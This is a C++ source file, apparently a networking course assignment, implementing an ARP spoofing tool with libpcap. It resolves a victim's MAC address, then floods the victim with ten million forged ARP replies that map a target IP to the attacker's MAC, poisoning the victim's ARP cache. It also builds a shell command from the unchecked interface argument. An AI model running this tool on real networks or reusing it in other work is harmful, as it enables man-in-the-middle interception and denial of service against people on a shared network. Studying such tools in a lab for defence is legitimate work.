
#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <thread>

#define MAC_ADDR_LEN 18
#define IP_ADDR_LEN 16
#define CMD_MAX_LEN 128

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface>\n");
    printf("sample: send-arp-test wlan0\n");
}

void get_my_ip_address(char *ipAddress, const char *interface) {
    FILE *fp;
    char cmd[CMD_MAX_LEN];

    // ifconfig 명령어 실행
    sprintf(cmd, "ifconfig %s | grep 'inet' | awk '{print $2}'", interface);
    fp = popen(cmd, "r");
    if (fp == NULL) {
        cout << "Failed to run command\n";
        exit(1);
    }

    // 결과 읽기
    fgets(ipAddress, IP_ADDR_LEN, fp);

    // 개행 문자 제거
    size_t len = strlen(ipAddress);
    if (len > 0 && ipAddress[len - 1] == '\n')
        ipAddress[len - 1] = '\0';

    pclose(fp);
}

void get_my_mac_address(char *macAddress, const char *interface) {
    FILE *fp;
    char cmd[CMD_MAX_LEN];

    // ifconfig 명령어 실행
    sprintf(cmd, "ifconfig %s | grep 'ether' | awk '{print $2}'", interface);
    fp = popen(cmd, "r");
    if (fp == NULL) {
        cout << "Failed to run command\n";
        exit(1);
    }

    // 결과 읽기
    fgets(macAddress, MAC_ADDR_LEN, fp);

    // 개행 문자 제거
    size_t len = strlen(macAddress);
    if (len > 0 && macAddress[len - 1] == '\n')
        macAddress[len - 1] = '\0';

    pclose(fp);
}


bool getMacAddress(pcap_t* handle, const char* dev, const Ip& my_ip, Mac& my_mac, const Ip& sender_ip, Mac& sender_mac) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
    packet.eth_.smac_ = Mac(my_mac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(my_mac); // fill in with my MAC address later
    packet.arp_.sip_ = htonl(my_ip);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(sender_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return false;
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* raw_packet;
        int res = pcap_next_ex(handle, &header, &raw_packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            return false;
        }

        EthHdr* eth_header = reinterpret_cast<EthHdr*>(const_cast<u_char*>(raw_packet));
        if (eth_header->type_ != htons(EthHdr::Arp)) continue;

        ArpHdr* arp_header = reinterpret_cast<ArpHdr*>(const_cast<u_char*>(raw_packet + sizeof(EthHdr)));


        if (arp_header->hrd_ != htons(ArpHdr::ETHER)) continue;
        if (arp_header->pro_ != htons(EthHdr::Ip4)) continue;
        if (arp_header->op_ != htons(ArpHdr::Reply)) continue;
        if (arp_header->sip_ != htonl(sender_ip)) continue;

        sender_mac = arp_header->smac_;
        return true;
    }
}

void send_arp_reply(pcap_t* handle, const char* dev, const Ip& target_ip, Mac& my_mac, const Ip& sender_ip, Mac& sender_mac){
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(sender_mac);
    packet.eth_.smac_ = Mac(my_mac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(my_mac);
    packet.arp_.sip_ = htonl(target_ip);
    packet.arp_.tmac_ = Mac(sender_mac);
    packet.arp_.tip_ = htonl(sender_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

}

int main(int argc, char* argv[]) {
    if (argc < 4 or argc % 2 == 1) {
        usage();
        return -1;
    }

    char MY_ipAddress[IP_ADDR_LEN];
    char MY_macAddress[MAC_ADDR_LEN];

    get_my_ip_address(MY_ipAddress, argv[1]);
    get_my_mac_address(MY_macAddress, argv[1]);

    Ip my_ip(MY_ipAddress);
    Mac my_mac(MY_macAddress);

    char* dev = argv[1];

    for(int i=1; 2*i+1 < argc; i++){
        int a = 2*i;
        Ip sender_ip(argv[a]);
        Ip target_ip(argv[a+1]);

        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
        if (handle == nullptr) {
            fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
            return -1;
        }

        Mac sender_mac;
        if (!getMacAddress(handle, dev, my_ip, my_mac, sender_ip, sender_mac)) {
            fprintf(stderr, "Failed to get MAC address for IP %s\n", argv[a]);
            pcap_close(handle);
            return -1;
        }

        for(int j=0;j<10000000;j++){
            send_arp_reply(handle, dev, target_ip, my_mac, sender_ip, sender_mac);
        }

        pcap_close(handle);
    }

    return 0;
}

